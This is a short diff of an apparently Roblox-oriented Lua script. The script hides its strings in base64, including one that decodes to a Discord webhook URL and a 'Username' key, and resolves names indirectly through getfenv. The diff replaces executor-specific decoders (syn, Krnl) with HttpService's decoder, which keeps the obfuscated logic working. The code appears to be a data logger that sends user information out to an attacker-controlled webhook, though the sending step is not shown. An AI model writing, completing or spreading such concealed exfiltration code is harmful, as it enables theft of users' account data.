@@ -21,11 +21,11 @@ local q2 = "VXNlcm5hbWU=" -- "Username"
 local q3 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MTAyMDYzNDkxMzM3NDI3OC9mUEtQWlRQcUcybUN5YWk2LW9lYnNNeDVqYWdYekxSV056QVFiNGo1UWtpZUNKajZkTHV5WlQxUFVoOXhvOW93ZFE2NQ==" 
 local q4 = "bmFtbm5uaTI=" -- "namnnni2"
 
-local r1 = syn and syn.crypt and syn.crypt.base64 or (Krnl and Krnl.Base64) or {decode=function(s)return game:GetService("HttpService"):Base64Decode(s) end}
-local r2 = r1.decode(q1)
-local r3 = r1.decode(q2)
-local r4 = r1.decode(q3)
-local r5 = r1.decode(q4)
+local decode = function(s) return game:GetService("HttpService"):Base64Decode(s) end
+local r2 = decode(q1)
+local r3 = decode(q2)
+local r4 = decode(q3)
+local r5 = decode(q4)
 
 local s=getfenv()[r2]
 local t=getfenv()[r3]
